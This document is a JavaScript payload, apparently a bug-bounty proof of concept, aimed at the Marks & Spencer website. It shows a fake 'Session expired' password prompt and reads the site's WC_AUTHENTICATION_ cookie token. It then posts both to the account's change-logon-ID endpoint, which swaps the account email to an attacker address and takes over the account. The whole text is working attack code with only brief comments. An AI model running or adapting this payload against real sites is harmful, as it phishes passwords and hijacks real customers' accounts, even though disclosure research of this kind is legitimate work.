// Prompt the user to enter the password
const password = prompt('Session expired. Please enter your password to login:');

// Find the authToken value from a cookie with a name starting with "WC_AUTHENTICATION_"
const authTokenCookie = document.cookie.split('; ').find(row => row.startsWith('WC_AUTHENTICATION_'));
const authToken = authTokenCookie ? authTokenCookie.split('=')[1] : null;

// URL for the second POST request
const secondUrl = 'https://www.marksandspencer.com/MSChangeLogonIdCmd';

// Body for the second POST request
const secondBody = `storeId=10151&catalogId=10051&langId=-24&URL=${encodeURIComponent('https://www.marksandspencer.com/MSAccountProfileDisplayView?catalogId=10051&langId=-24&storeId=10151&changeEmail=true')}&errorViewName=MSChangeLogonIdView&page=MyDetails&formType=MyAccount&authToken=${encodeURIComponent(authToken)}&logonId=bug_vs_me%2Battacker1234%40wearehackerone.com&retypeLogonId=bug_vs_me%2Battacker1234%40wearehackerone.com&verifyPassword=${encodeURIComponent(password)}&submit-sign-in=Save`;

// Perform the second POST request
fetch(secondUrl, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: secondBody,
  credentials: 'include',
})
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    return response.text();
  })
  .then(data => {
    console.log('Success:', data);
  })
  .catch(error => {
    console.error('Error:', error);
  });
